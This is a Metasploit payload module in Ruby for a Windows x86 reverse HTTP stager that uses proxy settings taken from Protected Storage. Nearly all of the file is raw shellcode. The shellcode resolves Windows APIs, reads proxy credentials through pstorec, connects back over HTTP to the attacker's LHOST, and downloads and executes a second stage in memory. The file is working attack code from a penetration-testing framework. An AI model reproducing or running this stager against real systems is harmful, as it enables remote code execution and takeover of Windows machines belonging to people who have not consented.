##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_http'
require 'msf/core/payload/uuid/options'

module MetasploitModule

  CachedSize = 665

  include Msf::Payload::Stager
  include Msf::Payload::Windows
  include Msf::Payload::UUID::Options

  def self.handler_type_alias
    "reverse_http_proxy_pstore"
  end

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Reverse HTTP Stager Proxy',
      'Description'   => 'Tunnel communication over HTTP',
      'Author'        => 'hdm',
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X86,
      'Handler'       => Msf::Handler::ReverseHttp,
      'Convention'    => 'sockedi http',
      'Stager'        =>
        {
          'Offsets' =>
            {
              'EXITFUNC' => [ 579, 'V' ],
              'LPORT'    => [ 499, 'v' ], # Not a typo, really little endian
            },
          'Payload' =>
# Built on Thu Mar  6 02:37:12 2014

# Name: stager_reverse_http_proxy_pstore
# Length: 649 bytes
# LEPort Offset: 499
# ExitFunk Offset: 579
"\xFC\xE8\x89\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B" +
"\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0" +
"\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x52\x57" +
"\x8B\x52\x10\x8B\x42\x3C\x01\xD0\x8B\x40\x78\x85\xC0\x74\x4A\x01" +
"\xD0\x50\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x3C\x49\x8B\x34\x8B" +
"\x01\xD6\x31\xFF\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4" +
"\x03\x7D\xF8\x3B\x7D\x24\x75\xE2\x58\x8B\x58\x24\x01\xD3\x66\x8B" +
"\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24" +
"\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x86\x5D" +
"\x60\xEB\x16\x6A\x40\x68\x00\x10\x00\x00\x68\x00\x10\x00\x00\x6A" +
"\x00\x68\x58\xA4\x53\xE5\xFF\xD5\xC3\xB3\x09\xE8\xE3\xFF\xFF\xFF" +
"\x50\xFE\xCB\x75\xF6\x68\x72\x65\x63\x00\x68\x70\x73\x74\x6F\x54" +
"\x68\x4C\x77\x26\x07\xFF\xD5\x5A\x5A\x5F\x57\x6A\x00\x6A\x00\x6A" +
"\x00\x57\x68\xDB\xBD\x64\x26\xFF\xD5\x58\x5A\x52\x50\x52\x6A\x00" +
"\x6A\x00\x8B\x00\x50\x8B\x10\x8B\x52\x38\xFF\xD2\xBF\x00\x81\x7E" +
"\x5E\x58\x5A\x59\x51\x52\x50\x6A\x00\x51\x6A\x01\x8B\x12\x52\x8B" +
"\x12\x8B\x52\x0C\xFF\xD2\x8B\x44\x24\x08\x8B\x00\x85\xC0\x0F\x84" +
"\xB1\x00\x00\x00\x39\xC7\x75\xD9\x58\x5A\x59\x5F\x57\x51\x52\x50" +
"\x57\x6A\x00\x51\x6A\x00\x8B\x00\x50\x8B\x10\x8B\x52\x3C\xFF\xD2" +
"\x8B\x44\x24\x0C\x8B\x54\x24\x10\x6A\x00\x52\x6A\x01\x8B\x00\x50" +
"\x8B\x10\x8B\x52\x0C\xFF\xD2\x58\x59\x5A\x52\x51\x50\x8B\x4C\x24" +
"\x10\x8B\x7C\x24\x14\x57\x6A\x00\x51\x52\x6A\x00\x8B\x00\x50\x8B" +
"\x10\x8B\x52\x54\xFF\xD2\x8B\x44\x24\x14\x8B\x4C\x24\x18\x6A\x00" +
"\x51\x6A\x01\x8B\x00\x50\x8B\x10\x8B\x52\x0C\xFF\xD2\x58\x50\x6A" +
"\x00\x6A\x00\x8B\x4C\x24\x24\x51\x8B\x4C\x24\x2C\x51\x8B\x4C\x24" +
"\x28\x8B\x09\x51\x8B\x4C\x24\x24\x51\x8B\x4C\x24\x20\x51\x6A\x00" +
"\x8B\x00\x50\x8B\x10\x8B\x52\x44\xFF\xD2\x8B\x44\x24\x1C\x8B\x00" +
"\x50\xB1\x3A\x8A\x10\x38\xD1\x74\x0C\x40\x8A\x10\x38\xD1\x75\xF9" +
"\xC6\x00\x00\x40\x50\x68\x6E\x65\x74\x00\x68\x77\x69\x6E\x69\x54" +
"\x68\x4C\x77\x26\x07\xFF\xD5\x31\xFF\x57\x57\x57\x57\x6A\x00\x54" +
"\x68\x3A\x56\x79\xA7\xFF\xD5\xEB\x4B\x5B\x31\xFF\x57\x57\x6A\x03" +
"\x51\x52\x68\x5C\x11\x00\x00\x53\x50\x68\x57\x89\x9F\xC6\xFF\xD5" +
"\xEB\x34\x59\x31\xD2\x52\x68\x00\x02\x20\x84\x52\x52\x52\x51\x52" +
"\x50\x68\xEB\x55\x2E\x3B\xFF\xD5\x89\xC6\x6A\x10\x5B\x31\xFF\x57" +
"\x57\x57\x57\x56\x68\x2D\x06\x18\x7B\xFF\xD5\x85\xC0\x75\x1A\x4B" +
"\x74\x10\xEB\xE9\xEB\x49\xE8\xC7\xFF\xFF\xFF\x2F\x31\x32\x33\x34" +
"\x35\x00\x68\xF0\xB5\xA2\x56\xFF\xD5\x6A\x40\x68\x00\x10\x00\x00" +
"\x68\x00\x00\x40\x00\x57\x68\x58\xA4\x53\xE5\xFF\xD5\x93\x53\x53" +
"\x89\xE7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xE2\xFF" +
"\xD5\x85\xC0\x74\xCD\x8B\x07\x01\xC3\x85\xC0\x75\xE5\x58\xC3\x5E" +
"\x5E\x5E\x59\x5A\xE8\x60\xFF\xFF\xFF"}
      ))
  end

  #
  # Do not transmit the stage over the connection.  We handle this via HTTPS
  #
  def stage_over_connection?
    false
  end

  #
  # Generate the first stage
  #
  def generate
    p = super
    i = p.index("/12345\x00")
    u = generate_uri_uuid_mode(:init_native, 5) + "\x00"
    p[i, u.length] = u
    p + datastore['LHOST'].to_s + "\x00"
  end

  #
  # Always wait at least 20 seconds for this payload (due to staging delays)
  #
  def wfs_delay
    20
  end
end
